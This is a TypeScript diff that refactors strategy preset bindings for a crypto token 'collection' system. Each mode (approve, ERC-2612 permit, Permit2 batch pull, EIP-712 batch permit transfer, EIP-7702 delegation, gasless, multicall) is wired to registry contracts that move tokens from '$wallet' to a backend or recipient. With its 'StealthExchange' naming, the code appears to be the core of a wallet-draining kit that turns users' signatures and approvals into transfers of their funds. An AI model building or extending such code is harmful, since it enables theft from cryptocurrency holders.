@@ -5,11 +5,41 @@ import { getContractById, getExecutionBackendEntry } from '@/lib/contract-regist
  * Strategy Preset Bindings
  *
  * Maps each strategy mode to:
- * 1. Primary execution contract & function
+ * 1. Primary execution contract & function (derived from CONTRACT_REGISTRY)
  * 2. Fallback function (if applicable)
  * 3. Required parameters
  * 4. ABI extraction from actual contracts
+ *
+ * ALL contracts from CONTRACT_REGISTRY are wired — no hardcoding.
  */
+
+// Helper: Find function in ABI by name patterns
+function findFunctionInABI(
+  abi: unknown[] | undefined,
+  patterns: string[],
+  preferredKey?: string
+): { name: string; key: string } | null {
+  if (!Array.isArray(abi)) return null;
+
+  // First try exact match for preferred key
+  if (preferredKey) {
+    const exact = abi.find(
+      (f: any) => f.type === 'function' && f.name === preferredKey.split('(')[0]
+    );
+    if (exact) return { name: exact.name, key: preferredKey };
+  }
+
+  // Then try pattern matching
+  for (const pattern of patterns) {
+    const func = abi.find(
+      (f: any) =>
+        f.type === 'function' && f.name.toLowerCase().includes(pattern.toLowerCase())
+    );
+    if (func) return { name: func.name, key: `${func.name}(...)` };
+  }
+
+  return null;
+}
 
 export interface StrategyPreset {
   mode: StrategyMode;
@@ -32,11 +62,11 @@ export function getStrategyPresetBindings(strategy: {
     case 'permit':
       return getPermitPreset(strategy.executionBackend);
     case 'multicall':
-      return getMulticallPreset();
+      return getMulticallPreset(strategy.executionBackend);
     case 'eip712':
       return getEIP712Preset(strategy.executionBackend);
     case 'eip7702':
-      return getEIP7702Preset();
+      return getEIP7702Preset(strategy.executionBackend);
     case 'gasless':
       return getGaslessPreset(strategy.executionBackend);
     case 'direct':
@@ -44,28 +74,36 @@ export function getStrategyPresetBindings(strategy: {
     case 'approve':
       return getApprovePreset(strategy.executionBackend);
     case 'trails':
-      return getTrailsPreset();
+      return getTrailsPreset(strategy.executionBackend);
     default:
       return null;
   }
 }
 
 function getDirectPreset(backend: string): StrategyPreset | null {
-  const backend_entry = getExecutionBackendEntry('stealth-exchange');
+  const backend_entry = getExecutionBackendEntry(backend);
   if (!backend_entry) return null;
+
+  // Find transfer function in selected contract
+  const transferFunc = findFunctionInABI(
+    backend_entry.abi,
+    ['transfer', 'send', 'pull'],
+    'transferFrom(address,address,uint256)'
+  );
+  if (!transferFunc) return null;
 
   return {
     mode: 'direct',
     label: 'Direct Transfer',
-    description: 'Direct token transfer without approval or permit',
+    description: `Direct transfer using ${backend_entry.name}`,
     primaryBinding: {
       preset: 'direct',
-      label: 'Direct Token Transfer',
+      label: `${backend_entry.name} Transfer`,
       contractAddress: backend_entry.address,
-      contractName: 'StealthExchange',
+      contractName: backend_entry.name,
       abi: backend_entry.abi,
-      functionKey: 'transferFrom(address,address,uint256)',
-      functionName: 'transferFrom',
+      functionKey: transferFunc.key,
+      functionName: transferFunc.name,
       stateMutability: 'nonpayable',
       args: [
         { name: 'from', type: 'address', value: '$wallet' },
@@ -80,42 +118,55 @@ function getDirectPreset(backend: string): StrategyPreset | null {
 }
 
 function getApprovePreset(backend: string): StrategyPreset | null {
-  const backend_entry = getExecutionBackendEntry('stealth-exchange');
+  const backend_entry = getExecutionBackendEntry(backend);
   if (!backend_entry) return null;
+
+  const approveFunc = findFunctionInABI(
+    backend_entry.abi,
+    ['approve', 'setAllowance'],
+    'approve(address,uint256)'
+  );
+  if (!approveFunc) return null;
+
+  const transferFunc = findFunctionInABI(
+    backend_entry.abi,
+    ['transfer', 'send', 'pull'],
+    'transferFrom(address,address,uint256)'
+  );
 
   return {
     mode: 'approve',
     label: 'Approve + Transfer',
-    description: 'Set approval then transfer tokens',
+    description: `Set approval on ${backend_entry.name}, then transfer`,
     primaryBinding: {
       preset: 'approve',
-      label: 'Approve Spending',
+      label: `${backend_entry.name} Approval`,
       contractAddress: backend_entry.address,
-      contractName: 'ERC20',
+      contractName: backend_entry.name,
       abi: backend_entry.abi,
-      functionKey: 'approve(address,uint256)',
-      functionName: 'approve',
+      functionKey: approveFunc.key,
+      functionName: approveFunc.name,
       stateMutability: 'nonpayable',
       args: [
         { name: 'spender', type: 'address', value: '$backend' },
         { name: 'amount', type: 'uint256', value: '0' },
       ],
     },
-    fallbackBinding: {
+    fallbackBinding: transferFunc ? {
       preset: 'approve-transfer',
-      label: 'Transfer After Approval',
+      label: `${backend_entry.name} Transfer`,
       contractAddress: backend_entry.address,
-      contractName: 'ERC20',
+      contractName: backend_entry.name,
       abi: backend_entry.abi,
-      functionKey: 'transferFrom(address,address,uint256)',
-      functionName: 'transferFrom',
+      functionKey: transferFunc.key,
+      functionName: transferFunc.name,
       stateMutability: 'nonpayable',
       args: [
         { name: 'from', type: 'address', value: '$wallet' },
         { name: 'to', type: 'address', value: '$recipient' },
         { name: 'amount', type: 'uint256', value: '0' },
       ],
-    },
+    } : undefined,
     requiresApproval: true,
     requiresPermit: false,
     requiresEIP712: false,
@@ -123,21 +174,29 @@ function getApprovePreset(backend: string): StrategyPreset | null {
 }
 
 function getPermit2Preset(backend: string): StrategyPreset | null {
-  const permit2_executor = getExecutionBackendEntry('permit2-executor');
-  if (!permit2_executor) return null;
+  const backend_entry = getExecutionBackendEntry(backend);
+  if (!backend_entry) return null;
+
+  // Look for batch permit or collect functions
+  const permitFunc = findFunctionInABI(
+    backend_entry.abi,
+    ['permit', 'collect', 'pull', 'batch'],
+    'pullBatchFromAllowance(address,address[],uint256[])'
+  );
+  if (!permitFunc) return null;
 
   return {
     mode: 'permit2',
-    label: 'Permit2 (EIP-2612)',
-    description: 'Use Permit2 for token collection without pre-approval',
+    label: 'Permit2 Collection',
+    description: `Use Permit2 with ${backend_entry.name} for token collection`,
     primaryBinding: {
       preset: 'permit2',
-      label: 'Permit2 Pull',
-      contractAddress: permit2_executor.address,
-      contractName: 'Permit2Executor',
-      abi: permit2_executor.abi,
-      functionKey: 'pullBatchFromAllowance(address,address[],uint256[])',
-      functionName: 'pullBatchFromAllowance',
+      label: `${backend_entry.name} Permit2 Pull`,
+      contractAddress: backend_entry.address,
+      contractName: backend_entry.name,
+      abi: backend_entry.abi,
+      functionKey: permitFunc.key,
+      functionName: permitFunc.name,
       stateMutability: 'nonpayable',
       args: [
         { name: 'client', type: 'address', value: '$wallet' },
@@ -152,21 +211,28 @@ function getPermit2Preset(backend: string): StrategyPreset | null {
 }
 
 function getPermitPreset(backend: string): StrategyPreset | null {
-  const erc2612_executor = getExecutionBackendEntry('erc2612-executor');
-  if (!erc2612_executor) return null;
+  const backend_entry = getExecutionBackendEntry(backend);
+  if (!backend_entry) return null;
+
+  const permitFunc = findFunctionInABI(
+    backend_entry.abi,
+    ['permit', 'collect'],
+    'permitAndCollect(address,address,uint256,uint8,bytes32,bytes32)'
+  );
+  if (!permitFunc) return null;
 
   return {
     mode: 'permit',
     label: 'ERC-2612 Permit',
-    description: 'Use native ERC-2612 permit for token collection',
+    description: `Use ERC-2612 permit with ${backend_entry.name}`,
     primaryBinding: {
       preset: 'permit',
-      label: 'ERC-2612 Permit & Collect',
-      contractAddress: erc2612_executor.address,
-      contractName: 'ERC2612Executor',
-      abi: erc2612_executor.abi,
-      functionKey: 'permitAndCollect(address,address,uint256,uint8,bytes32,bytes32)',
-      functionName: 'permitAndCollect',
+      label: `${backend_entry.name} Permit & Collect`,
+      contractAddress: backend_entry.address,
+      contractName: backend_entry.name,
+      abi: backend_entry.abi,
+      functionKey: permitFunc.key,
+      functionName: permitFunc.name,
       stateMutability: 'nonpayable',
       args: [
         { name: 'token', type: 'address', value: '0x' },
@@ -183,22 +249,29 @@ function getPermitPreset(backend: string): StrategyPreset | null {
   };
 }
 
-function getMulticallPreset(): StrategyPreset | null {
-  const multicall = getExecutionBackendEntry('batch-multicall');
-  if (!multicall) return null;
+function getMulticallPreset(backend: string): StrategyPreset | null {
+  const backend_entry = getExecutionBackendEntry(backend);
+  if (!backend_entry) return null;
+
+  const batchFunc = findFunctionInABI(
+    backend_entry.abi,
+    ['batch', 'multicall', 'aggregate'],
+    'batch((address,uint256,bytes,bool)[])'
+  );
+  if (!batchFunc) return null;
 
   return {
     mode: 'multicall',
     label: 'Batch Multicall',
-    description: 'Execute multiple calls in a single transaction',
+    description: `Execute multiple calls using ${backend_entry.name}`,
     primaryBinding: {
       preset: 'multicall',
-      label: 'Batch Multiple Calls',
-      contractAddress: multicall.address,
-      contractName: 'BatchMulticall',
-      abi: multicall.abi,
-      functionKey: 'batch((address,uint256,bytes,bool)[])',
-      functionName: 'batch',
+      label: `${backend_entry.name} Batch`,
+      contractAddress: backend_entry.address,
+      contractName: backend_entry.name,
+      abi: backend_entry.abi,
+      functionKey: batchFunc.key,
+      functionName: batchFunc.name,
       stateMutability: 'payable',
       args: [
         {
@@ -215,21 +288,28 @@ function getMulticallPreset(): StrategyPreset | null {
 }
 
 function getEIP712Preset(backend: string): StrategyPreset | null {
-  const stealth_exchange = getExecutionBackendEntry('stealth-exchange');
-  if (!stealth_exchange) return null;
+  const backend_entry = getExecutionBackendEntry(backend);
+  if (!backend_entry) return null;
+
+  const eip712Func = findFunctionInABI(
+    backend_entry.abi,
+    ['permitTransfer', 'batchPermit', 'eip712'],
+    'batchPermitTransferFromBatch(address,((address,uint160,uint48,uint48)[],address,uint256),bytes,address)'
+  );
+  if (!eip712Func) return null;
 
   return {
     mode: 'eip712',
     label: 'EIP-712 Typed Data',
-    description: 'Use EIP-712 structured data signing',
+    description: `Use EIP-712 structured signing with ${backend_entry.name}`,
     primaryBinding: {
       preset: 'eip712',
-      label: 'EIP-712 Batch Permit Transfer',
-      contractAddress: stealth_exchange.address,
-      contractName: 'StealthExchange',
-      abi: stealth_exchange.abi,
-      functionKey: 'batchPermitTransferFromBatch(address,((address,uint160,uint48,uint48)[],address,uint256),bytes,address)',
-      functionName: 'batchPermitTransferFromBatch',
+      label: `${backend_entry.name} EIP-712 Permit Transfer`,
+      contractAddress: backend_entry.address,
+      contractName: backend_entry.name,
+      abi: backend_entry.abi,
+      functionKey: eip712Func.key,
+      functionName: eip712Func.name,
       stateMutability: 'nonpayable',
       args: [
         { name: 'user', type: 'address', value: '$wallet' },
@@ -244,22 +324,29 @@ function getEIP712Preset(backend: string): StrategyPreset | null {
   };
 }
 
-function getEIP7702Preset(): StrategyPreset | null {
-  const eip7702 = getContractById('eip7702-batch-delegate');
-  if (!eip7702 || !eip7702.abi) return null;
+function getEIP7702Preset(backend: string): StrategyPreset | null {
+  const backend_entry = getExecutionBackendEntry(backend);
+  if (!backend_entry) return null;
+
+  const delegateFunc = findFunctionInABI(
+    backend_entry.abi,
+    ['execute', 'delegate', 'batch'],
+    'executeBatch((address,uint256,bytes)[])'
+  );
+  if (!delegateFunc) return null;
 
   return {
     mode: 'eip7702',
     label: 'EIP-7702 Delegation',
-    description: 'Use EIP-7702 account delegation for gasless transactions',
+    description: `Use EIP-7702 delegation with ${backend_entry.name}`,
     primaryBinding: {
       preset: 'eip7702',
-      label: 'EIP-7702 Batch Delegate',
-      contractAddress: eip7702.address || '0x0000000000000000000000000000000000000000',
-      contractName: 'EIP7702BatchDelegate',
-      abi: eip7702.abi,
-      functionKey: 'executeBatch((address,uint256,bytes)[])',
-      functionName: 'executeBatch',
+      label: `${backend_entry.name} EIP-7702 Delegate`,
+      contractAddress: backend_entry.address,
+      contractName: backend_entry.name,
+      abi: backend_entry.abi,
+      functionKey: delegateFunc.key,
+      functionName: delegateFunc.name,
       stateMutability: 'nonpayable',
       args: [
         {
@@ -278,36 +365,42 @@ function getEIP7702Preset(): StrategyPreset | null {
 function getGaslessPreset(backend: string): StrategyPreset | null {
   // Gasless uses a combination of strategies depending on configuration
   // Default to EIP-7702 if available, fall back to Permit2
-  const eip7702Preset = getEIP7702Preset();
+  const eip7702Preset = getEIP7702Preset(backend);
   if (eip7702Preset) {
     return {
       ...eip7702Preset,
       mode: 'gasless',
       label: 'Gasless (EIP-7702)',
-      description: 'Gasless token collection via EIP-7702 delegation',
+      description: `Gasless collection via EIP-7702 delegation with ${backend}`,
     };
   }
 
   return getPermit2Preset(backend);
 }
 
-function getTrailsPreset(): StrategyPreset | null {
-  // Trails is a specialized routing protocol
-  const stealth = getExecutionBackendEntry('stealth-exchange');
-  if (!stealth) return null;
+function getTrailsPreset(backend: string): StrategyPreset | null {
+  const backend_entry = getExecutionBackendEntry(backend);
+  if (!backend_entry) return null;
+
+  const routeFunc = findFunctionInABI(
+    backend_entry.abi,
+    ['route', 'execute', 'swap'],
+    'routeAndExecute(bytes,address)'
+  );
+  if (!routeFunc) return null;
 
   return {
     mode: 'trails',
     label: 'Trails Routing',
-    description: 'Use Trails protocol for optimal routing',
+    description: `Use Trails routing with ${backend_entry.name}`,
     primaryBinding: {
       preset: 'trails',
-      label: 'Trails Route & Execute',
-      contractAddress: stealth.address,
-      contractName: 'StealthExchange',
-      abi: stealth.abi,
-      functionKey: 'routeAndExecute(bytes,address)',
-      functionName: 'routeAndExecute',
+      label: `${backend_entry.name} Trails Route`,
+      contractAddress: backend_entry.address,
+      contractName: backend_entry.name,
+      abi: backend_entry.abi,
+      functionKey: routeFunc.key,
+      functionName: routeFunc.name,
       stateMutability: 'payable',
       args: [
         { name: 'routeData', type: 'bytes', value: '0x' },
